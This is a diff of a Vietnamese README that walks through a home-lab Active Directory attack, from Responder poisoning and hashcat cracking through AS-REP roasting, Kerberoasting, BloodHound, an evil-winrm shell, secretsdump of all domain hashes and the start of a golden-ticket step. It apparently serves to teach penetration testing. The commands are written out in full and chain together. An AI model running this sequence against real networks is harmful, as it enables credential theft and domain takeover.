@@ -1,7 +1,25 @@
 # Windows-Privilege-Escalation
 Leo thang đặc quyền để có được tài liệu và quyền 
 
-# Thay đổi chính sách thực thi
+## Mục lục
+- [Tạo môi trường](https://github.com/DucThongNby/Windows-Privilege-Escalation/edit/main/README.md#thay-%C4%91%E1%BB%95i-ch%C3%ADnh-s%C3%A1ch-th%E1%BB%B1c-thi)
+- [Quét cổng và máy, lấy thông tin nạn nhân đầu tiên](https://github.com/DucThongNby/Windows-Privilege-Escalation/edit/main/README.md#qu%C3%A9t-l%E1%BB%97-h%E1%BB%95ng-l%E1%BA%A5y-th%C3%B4ng-tin-ng%C6%B0%E1%BB%9Di-d%C3%B9ng-c%C6%A1-b%E1%BA%A3n)
+- [Liệt kê người dùng trong domain](#hướng-dẫn-sử-dụng)
+- [Tấn công không yêu cầu xác thực trước](#hướng-dẫn-sử-dụng)
+- [Leo thang đặc quyền](#hướng-dẫn-sử-dụng)
+- [Remote máy nạn nhân](#hướng-dẫn-sử-dụng)
+- [Thu thập mã hash](#hướng-dẫn-sử-dụng)
+- [Duy trì đăng nhập](#hướng-dẫn-sử-dụng)
+- [Tấn công không yêu cầu xác thực trước](#hướng-dẫn-sử-dụng)
+- [Tấn công không yêu cầu xác thực trước](#hướng-dẫn-sử-dụng)
+- [Tấn công không yêu cầu xác thực trước](#hướng-dẫn-sử-dụng)
+
+
+         
+
+      
+
+## Tạo môi trường
 
 Các bước cài đặt:
 1) ***Thay đổi chính sách***
@@ -16,7 +34,7 @@ Install-windowsfeature AD-domain-services
 ```
 ![Cài Active Directory Domain Services_Collecting Data](https://github.com/user-attachments/assets/01620801-37e3-4b78-af53-2f50be0b48e7)
 
-____
+Cài đặt thành công
 ![Success](https://github.com/user-attachments/assets/59533700-d433-4fb8-b63b-53eecf3a80d8)
 
 3) ***Nạp module ADDSDeployment để sử dụng các lệnh liên quan đến triển khai ADDS***
@@ -45,31 +63,35 @@ ____ Thành công
 ![Success](https://github.com/user-attachments/assets/bf3d7992-f6d6-47a0-a301-a178667e173a)
 
 
-# Quét lỗ hổng, lấy thông tin người dùng cơ bản
+## Quét cổng và máy, lấy thông tin nạn nhân đầu tiên
 Máy attack : Kali
 Máy victim : Window Server
 Ta biết hai máy này cùng dải địa chỉ
 IP của Kali : 192.168.168.2
 ![IP_Kali](https://github.com/user-attachments/assets/068bf831-fae0-4a48-9b87-fa3c6019f200)
-___Nmap
+
+1. Nmap
 ```Bash
 nmap 192.1689.168.0/24
 ```
 ![Nmap](https://github.com/user-attachments/assets/e7594472-1d24-4d5e-a7ff-7dc3d319766a)
+
 Quét ra 4 địa chỉ :
 - 192.168.168.1
 - 192.168.168.13
 - 192.168.168.254
 - 192.168.168.2
 
-__Dùng Crackmapexec , quét giao thức SMB trong dải địa chỉ 192.168.168.0/24
+2. Crackmapexec
+Quét giao thức SMB trong dải địa chỉ 192.168.168.0/24
 ```Bash
 crackmapexec smb 192.168.168.0.24
 ```
 ![crackmapexec](https://github.com/user-attachments/assets/1784a766-5d30-4f81-9dad-88af20ece2e8)
 Ta thấy có máy SERVER_PTIT __ IP 192.168.168.13
 
-__ Dùng Responder xem có ai viết sai tên trong quá trình tìm kiếm domain__
+3. Responder
+Xem có ai viết sai tên trong quá trình tìm kiếm domain__
 Khi người dùng nhập thiếu tên, ví dụ chỉ nhập ATTT và thiếu .ptit
 DNS không phân giải được địa chỉ và hỏi các mạng xung quanh xem có biết địa chỉ "ATTT" ở đâu không
 Responder sẽ trả lời nó biết, yêu cầu nạn nhân cung cấp thông tin
@@ -87,7 +109,7 @@ sudo responder -I eth0 -d -w -v
 ___Win10 nhập tên domain không đủ
 ![Tên domain chưa đủ](https://github.com/user-attachments/assets/66b18bb2-2b84-499c-a549-6c5ca6f8a896)
 
-___ Ở phía Kali
+___ Ở phía Kali giả làm Server để lừa nạn nhân
 ![Có mã hash](https://github.com/user-attachments/assets/23aac742-e09b-4620-a4bc-2877ee5dad91)
 
 Ta có mã hash của nạn nhân đầu tiên
@@ -101,7 +123,8 @@ hashcat hash.txt /usr/share/wordlists/rockyou.txt -o pass.txt
 ___ cat pass.txt
 ![cat pass.txt](https://github.com/user-attachments/assets/aa582bcc-010b-489c-9260-eb78729333bb)
 
-***Liệt kê người dùng trong domain***
+## Liệt kê người dùng trong domain
+1. ldapsearch
 ```Bash
 ldapsearch -x -H ldap://192.168.168.13 -b "DC=ATTT,DC=ptit" | grep "userPrincipalName" | awk 'NF{print $NF}' | awk -F '@' '{print $1}' > users
 ```
@@ -114,7 +137,7 @@ Ta thấy có 3 mật khẩu cùng với 4 tài khoản có mật khẩu mặc �
 Ta lưu những mật khẩu này vào password.txt để dùng sau
 ![password.txt](https://github.com/user-attachments/assets/341e3e70-e863-4e36-a3d3-1a4f515958bd)
 
-***Tấn công không yêu cầu xác thực trước***
+## Tấn công không yêu cầu xác thực trước
 ```Bash
 impacket-GetNPUsers ATTT.ptit/ -no-pass -usersfile users -format hashcat -outputfile domainhash.txt -dc-ip 192.168.168.13
 // impacket: công cụ khai thác AS-REP Roasting
@@ -146,7 +169,7 @@ group_memberships.json – Mối quan hệ giữa các nhóm và thành viên.
 domain_gpos.json – Danh sách Group Policy Objects (GPO).
 domain_trusts.json – Danh sách các mối quan hệ trust giữa các domain.
 
-***Blood Hound _dữ liệu đồ thị***
+## Leo thang đặc quyền
 Ta dùng BloodHound để tìm tài khoản và đường đi để leo thang đặc quyền
 1) Thu thạp dữ liệu domain cho BloodHound
 ```Bash
@@ -177,7 +200,7 @@ hashcat kerberoastable.txt 10-million-password-list-top-1000000.txt -o passdomai
 ![Pass Domain](https://github.com/user-attachments/assets/ae6bd25b-710b-47ac-b63f-ab8f942cc062)
 __ta được 2/4 tài khoản
 
-***Leo thang đặc quyền***
+***Tìm đường đi để leo thang***
 Dùng hàm Shortest Paths from Kerberoastable Users
 Chọn mục tiêu là server ATTT.ptit
 Tài khoản thì ta thấy có HTTP_SVC là có kết quả trả về
@@ -197,7 +220,8 @@ net rpc group members "OFFICE ADMIN" -U "ATTT.ptit/HTTP_SVC%panther" -S 192.168.
 
 
 
-***Evil winrm***
+## Remote máy nạn nhân
+Dùng Evil winrm
 Lấy shell , và có thể tải mã độc, download file,...
 ```Bash
 evil-winrm -i 192.168.168.13 -u HTTP_SVC -p panther
@@ -205,14 +229,17 @@ evil-winrm -i 192.168.168.13 -u HTTP_SVC -p panther
 ![Success](https://github.com/user-attachments/assets/43b71a46-ff17-4027-bd58-e064fe1ef1ed)
 Tôi đã chạy whoami
 
-***Secret Dump***
+## Thu thập mã hash 
+Dùng Secret Dump
 Lấy mã hash tất cả tài khoản trong domain:
 ```Bash
 impacket-secretsdump ATTT.ptit/HTTP_SVC:panther@192.168.168.13 > credentials.txt
 ```
 ![Credential](https://github.com/user-attachments/assets/27f3e17f-6212-4cfa-9586-0cf9dcee2f37)
 
-***Golden ticket***
+
+## Duy trì đăng nhập
+Lấy Golden ticket
 Lọc mã hash của tài khoản krb
 __ Lấy mã hash của tài khoản Admin
 ```Bash
